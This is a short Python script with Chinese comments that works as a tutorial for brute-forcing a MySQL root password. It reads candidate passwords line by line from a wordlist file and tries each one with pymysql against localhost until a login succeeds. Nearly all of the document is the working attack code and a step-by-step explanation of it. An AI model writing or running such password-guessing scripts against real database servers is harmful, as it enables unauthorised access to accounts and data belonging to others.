#!/usr/bin/python3.6
# -*- coding: utf-8 -*-

import pymysql#导入连接数据库的模块


'''
python暴力破解mysql数据。

当然还是先讲一下整体思路：

1）大家知道mysql需要账号和密码才能登陆，我们今天做一个在知道账号的情况下对密码进行破解。（后面继续跟进账号密码都不知道的情况）

2）既然是暴力破解，避免离开不了密码字典，对于密码字典，我们采用从文本文档进行读取。 
如果还不知道怎样从(.txt）格式文件中读取数据，请看我的这篇文章 简单python逐行读取文件中的内容

3）利用密码字典我们可以不停的刷密码，从而破解成功进行登录。
'''
class PoJie:
    def __init__(self,path):
        self.file =open(path,"r",errors="ignore")#打开密码字典文件

    def LianJieMySql(self,word):#连接数据库的方法
        try:
            db =pymysql.connect("localhost","root",word) #连接数据库
            #pymysql.connect()方法的第一个参数是ip地址，本机可以用localhost代替
            #第二个参数是账户名，本文章为知道用户名情况破解密码
            #第三个是密码，
            db.close()#关闭数据库
            return True#连接成功返回True
        except:
            return False

    def PoJieChangShi(self):#读取密码字典的方法
        while True:#循环读取
            mystr=self.file.readline()#读取密码字典的一行
            if not mystr:#如果读到文件最后没有数据了，就跳出循环
                break
            if self.LianJieMySql(mystr):#把读到的一行密码传到连接数据库方法里面
                #如果返回了True说明破解成功
                print("密码正确----",mystr)#打印正确密码
                break#结束循环
            else :
                print("密码错误",mystr)

    def __del__(self):#无论如何最终要执行的方法
        self.file.close()#关闭密码字典文件
        pass

path=r"C:\Users\Administrator\Desktop\wordlist.txt"#传入密码字典绝对文件路径
start =PoJie(path)#实例化对象
start.PoJieChangShi()#对象执行方法


'''
是不是很简单啊！

我简单说一下实现过程：

1）首先，一定要导入连接数据库的模块也就是（import pymysql） 
2）写了一个连接数据库的方法，写了一个从文本文档逐行读取密码的方法。 
3）对于读取的每一行密码，我们都把它传入连接数据库的方法中，进行连接测试。 
4）如果连接成功则返回True。 
5）这里使用了try语句，因为当连接失败，也就是密码不正确的时候， 
系统会报错，所以我们使用try捕获异常，抛出错误， 
避免系统出现异常错误终止我们的程序。

密码字典哪里来，大家可以自己使用python生成器进行生成

'''